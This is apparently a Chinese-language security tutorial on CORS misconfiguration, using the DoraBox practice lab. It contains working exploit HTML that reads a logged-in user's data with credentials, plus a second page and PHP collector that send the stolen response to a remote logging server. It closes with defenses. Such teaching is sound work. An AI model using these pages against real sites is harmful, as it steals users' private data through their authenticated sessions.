# 简介

网站如果存CORS跨域漏洞就会有用户敏感数据被窃取的风险。
跨域资源共享（CORS）是一种浏览器机制，可实现对位于给定域外部的资源的受控访问。它扩展了同源策略（SOP）并增加了灵活性。但是，如果网站的CORS策略配置和实施不当，它也可能带来基于跨域的攻击。CORS并不是针对跨域攻击（例如跨站点请求伪造（CSRF））的保护措施。

## 同源策略

这里我们必须要了解一下同源策略：同源策略是一种限制性的跨域规范，它限制了网站与源域之外的资源进行交互的能力。起源于多年前的策略是针对潜在的恶意跨域交互（例如，一个网站从另一个网站窃取私人数据）而制定的。通常，它允许一个域向其他域发出请求，但不允许访问响应。**源由通信协议，域和端口号组成**。
SOP是一个很好的策略，但是随着Web应用的发展，网站由于自身业务的需求，需要实现一些跨域的功能，能够让不同域的页面之间能够相互访问各自页面的内容。

# CORS跨域资源共享请求与响应

## 简单请求

跨域资源共享（CORS）规范规定了在Web服务器和浏览器之间交换的标头内容，该标头内容限制了源域之外的域请求web资源。CORS规范标识了协议头中Access-Control-Allow-Origin最重要的一组。当网站请求跨域资源时，服务器将返回此标头，并由浏览器添加标头Origin。
例如下面的来自站点 [http://example.com](http://example.com/) 的网页应用想要访问 [http://bar.com](http://bar.com/) 的资源：
`requests`

```http
1  GET /resources/public-data/ HTTP/1.1
2  Host: bar.com
3  User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3pre
4  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
5  Accept-Language: en-us,en;q=0.5
6  Accept-Encoding: gzip,deflate
7  Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
8  Connection: keep-alive
9  Referer: http://example.com/examples/access-control/simpleXSInvocation.html
10 Origin: http://example.com
response
```

```http
11  HTTP/1.1 200 OK
12  Date: Mon, 01 Dec 2020 00:23:53 GMT
13  Server: Apache/2.0.61 
14  Access-Control-Allow-Origin: *
15  Keep-Alive: timeout=2, max=100
16  Connection: Keep-Alive
17  Transfer-Encoding: chunked
18  Content-Type: application/xml
```

第 1~9 行是请求首部。在第10行的请求头 Origin 表明该请求来源于 [http://example.com](http://example.com/)。
第 11~18 行是来自于 [http://bar.com](http://bar.com/) 的服务端响应。响应中携带了响应首部字段 `Access-Control-Allow-Origin`（第 14 行）。使用 `Origin` 和 `Access-Control-Allow-Origin` 就能完成最简单的访问控制。本例中，服务端返回的 `Access-Control-Allow-Origin: *` 表明，该资源可以被任意外域访问。如果服务端仅允许来自 [http://example.com](http://example.com/) 的访问，该首部字段的内容如下：
`Access-Control-Allow-Origin: http://example.com`
如果跨域请求可以包含cookie的话，在服务器响应里应该有这一字段：
`Access-Control-Allow-Credentials: true`
这样的话攻击者就可以利用这个漏洞来窃取已经在这个网站上登录了的用户的信息（利用cookie）

# DroaBox靶场示例

<img src="图片\Snipaste_2023-03-16_15-18-31.png" alt="Snipaste_2023-03-16_15-18-31" style="zoom: 67%;" />

这个接口会返回已登录的用户的信息数据，通过访问该网页的响应我们看到这里可能存在 CORS 跨域资源共享漏洞

<img src="图片\Snipaste_2023-03-16_15-22-21.png" alt="Snipaste_2023-03-16_15-22-21" style="zoom: 80%;" />

## 利用方式一

接下来我们就可以建立一个恶意的js代码

```html
<!-- cors.html -->
<!DOCTYPE html>
<html>
<head>
 <title>cors exp</title>
</head>
<body>
<script type="text/javascript">
function cors() {  
var xhttp = new XMLHttpRequest();  
xhttp.onreadystatechange = function() {    
    if (this.status == 200) {    
    alert(this.responseText);     
    document.getElementById("demo").innerHTML = this.responseText;    
    }  
};  
xhttp.open("GET", "http://127.0.0.1:8081/DoraBox/csrf/userinfo.php");  
xhttp.withCredentials = true;  
xhttp.send();
}
cors();
</script>
</body>
</html>
```

访问这个页面就可以获取已登录的用户的信息

<img src="图片\Snipaste_2023-03-16_15-25-22.png" alt="Snipaste_2023-03-16_15-25-22" style="zoom:80%;" />

该恶意代码首先定义一个函数cors，以get形式访问目标网址，创建XMLHttpRequest对象为xhttp，通过ajax的onreadystatechange判断请求状态，如果请求已完成，且相应已就绪，则弹出返回文本。

## 利用方式二

首先在远程服务器上准备记录代码 `zf1yolo.php`：

```php
<?php
$data = $_POST['zf1yolo'];
if($data){
$myfile = fopen("data.html","w");
fwrite($myfile,$data);
fclose($myfile);
}
```

再构造恶意代码 `CorsEXP.html` ：

```html
</head>
<body>
<script>
function cors() {
var xhr = new XMLHttpRequest();
var xhr1 = new XMLHttpRequest();
xhr.onreadystatechange = function () {
if(xhr.readyState == 4){
alert(xhr.responseText)
var data = xhr.responseText;
xhr1.open("POST","http://127.0.0.1:8081/zf1yolo.php",true);
xhr1.setRequestHeader("Content-type","application/x-www-form-urlencoded");
alert(data);
xhr1.send("zf1yolo="+escape(data));
// body = document.getElementsByTagName('body')
// body[0].innerHTML = xhr.responseText;
}
}
//xhr.withCredentials = true;
xhr.open("GET",'http://127.0.0.1:8081/Dorabox/csrf/userinfo.php');
xhr.send();
}
cors();
</script>
</body>
</html>
```

当受害者浏览器此页面 CorsEXP.html 时，就会访问敏感信息，会把敏感信息发送到远程服务器上，创建 data.html 存储数据

<img src="图片\Snipaste_2023-03-16_15-45-10.png" alt="Snipaste_2023-03-16_15-45-10" style="zoom:80%;" />

# 漏洞利用技巧

在之前我们了解了一些关于CORS跨域资源共享通信的一些字段含义，
CORS的漏洞主要看当我们发起的请求中带有Origin头部字段时，服务器的返回包带有CORS的相关字段并且允许Origin的域访问。
一般测试WEB漏洞都会用上BurpSuite，而BurpSuite可以实现帮助我们检测这个漏洞。

首先是自动在HTTP请求包中加上Origin的头部字段，打开BurpSuite，选择Proxy模块中的Options选项，找到Match and Replace这一栏，勾选Request header 将空替换为Origin:example.com的Enable框。
当我们进行测试时，看服务器响应头字段里可以关注这几个点：
`最好利用的配置：`
Access-Control-Allow-Origin: [https://attacker.com](https://attacker.com/)
Access-Control-Allow-Credentials: true
`可能存在可利用的配置：`
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
`很好的条件但无法利用：`
下面这组配置组合虽然看起来很完美但是CORS机制已经默认自动禁止了这种组合，算是CORS的最后一道防线
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
`单一的情况`
Access-Control-Allow-Origin：*

**总结漏洞的原因：**

1：CORS服务端的 Access-Control-Allow-Origin 设置为了 *，并且 Access-Control-Allow-Credentials 设置为false，这样任何网站都可以获取该服务端的任何数据了。

2：**有一些网站的Access-Control-Allow-Origin他的设置并不是固定的，而是根据用户跨域请求数据的Origin来定的**。这时，不管Access-Control-Allow-Credentials 设置为了 true 还是 false。任何网站都可以发起请求，并读取对这些请求的响应。意思就是任何一个网站都可以发送跨域请求来获得CORS服务端上的数据。

# 防御方案 

1、不要配置"Access-Control-Allow-Origin" 为通配符“*”，而且更重要的是，要严格效验来自请求数据包中的"Origin" 的值。当收到跨域请求的时候，要检查"Origin" 的值是否是一个可信的源，还要检查是否为 null 

2、避免使用"Access-Control-Allow-Credentials: true" 

3、减少 Access-Control- Allow-Methods 所允许的方法
